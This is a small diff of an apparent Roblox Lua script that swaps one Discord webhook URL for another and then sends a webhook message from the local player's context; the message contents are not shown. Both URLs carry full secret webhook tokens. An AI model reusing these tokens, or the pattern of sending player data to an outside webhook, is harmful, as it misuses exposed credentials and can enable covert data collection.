@@ -5,7 +5,7 @@ local plr = game.Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 
 -- 🌐 Your Discord Webhook
-local webhookURL = "https://discord.com/api/webhooks/1386632020402245632/R774BEgllTUj13wX5IK9J_8qrqXUZX-6mLGyxrF2vDWUmw6Ak7b89OutzI2wvGScfQa4"
+local webhookURL = "https://discord.com/api/webhooks/1386642030825832499/lnSBWvZlLkhbvWY8FhscbHaJue3wptVcyQf3hrxahqI0SWSEm-wOHFNVFyc0M5IAUPF4"
 
 -- 🔔 Send webhook message
 pcall(function()
